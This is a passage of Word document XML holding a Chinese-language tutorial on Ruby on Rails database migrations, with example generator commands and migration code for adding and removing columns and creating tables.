        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5520"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="600996B3" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1095022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CreateProducts &lt; ActiveRecord::Migration</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F8158A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change</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="603201F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create_table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7983172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t.string :name</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="351C47F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t.text :description</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="190211C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F70852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t.timestamps</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1AB0700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7DC5733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1AE1B5D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AE7479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如果有需要的话你可以追加更多的"名称/类型"字段。默认会生成的迁移任务都会包含 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>t.timestamps</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">（这个会生成 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>updated_at</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>created_at</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 字段，而 Active Record 会在 新增数据和更新时自动更新时间）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45B146CA"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2.2 建立一个独立的迁移任务</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CF5876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如果你建立迁移任务不是为了新增 Model，而是为了其他目的（例如为现在的数据库表添加 字段），那可以只用迁移任务的生成器：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6000"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="5CF64028" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="32575F78" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="632253697"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>$ rails generate migration AddPartNumberToProducts</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6E0815E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这样会建立一个空白的但已经命名好的迁移任务:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6600"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="0A6FF953" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="473CEA7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AddPartNumberToProducts &lt; ActiveRecord::Migration</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="06FB2C2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change</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6CD976A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6DA913F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4BC8BB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如果迁移任务的文件名命名为 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>"AddXXXToYYY"</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>"RemoveXXXFromYYY"</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这类格式，后面再加上 一串字段名和类型的清单，那么这个migration就会含有对应的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>add_column</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>remove_column</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 语句。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8280"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="38671B17" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5049C067" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="746070114"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>$ rails generate migration AddPartNumberToProducts part_number:string</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="66871BD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将会生成：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6600"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="41D21185" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6844FDA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AddPartNumberToProducts &lt; ActiveRecord::Migration</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39C48A2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change</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43F4A56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add_column :products, :part_number, :string</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B7A32D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39FD347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32F6EAD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类似的，</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="6B9C7C5E" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="459B230D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1231426328"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>$ rails generate migration RemovePartNumberFromProducts part_number:string</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6D5C096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则生成：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7200"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="14D7F432" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7EE1739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RemovePartNumberFromProducts &lt; ActiveRecord::Migration</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A1BF9C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up</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E49979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remove_column :products, :part_number</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3848547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49DD3B5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47393CF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down</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79E56FF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add_column :products, :part_number, :string</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7205C14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61D3C92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3BBFE9A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这种方法可以操作多个字段，例如：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="7CF9CF71" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4C7343B8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1112440312"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>$ rails generate migration AddDetailsToProducts part_number:string price:decimal</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="16982DF2"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将会生成：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6240"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="6C6B7C2C" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6727552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AddDetailsToProducts &lt; ActiveRecord::Migration</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6AFBD5B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change</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A42F86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add_column :products, :part_number, :string</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="563FFA9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add_column :products, :price, :decimal</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F7DE3D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4B99F57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28793E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通常来说，这些自动生成的迁移任务只是用来初始化，我们接下来可以直接修改文件直到我们满意。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5642D352"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这些生成出来的migration文件往往还是使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>up</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>down</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法的旧写法。这是因为Rails需要 知道在我们做最初的改变时原始的数据类型有没有被定义。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CB1E41A"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3 编写一个迁移任务</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F88A83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当你建立一个migration文件时，接下来就是我们要做的了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28A9251C"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3.1 建立数据表</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C017DA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一般要建立数据表可以用迁移任务的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>create_table</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法。典型的用法如下：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3480"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="0AA58F5D" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="603F8C9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create_table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0101A45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t.string :name</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3709B65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C799A9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这样会建立了一个名为 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>products</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的数据表，里面包含一个名为 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>name</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的字段（如之前所说， 这里也会自动加上一个</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>字段）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="302D128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这段代码块可以让你在数据表中新增字段。新增的的方法有格式，第一种，也是相对传统的 写法，如下：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5160"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="3FFA6D9B" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4C2BFC2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create_table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4E74AEA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t.column :name, :string, :null</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D5DBBC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54BADC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第二种格式，就是所谓的"sexy"写法，把 column 去掉了，用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>string</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>integer</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 等方法来 建立对应类型的字段。至于在后面添加的参数是一样的。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4080"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="628DAFAC" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
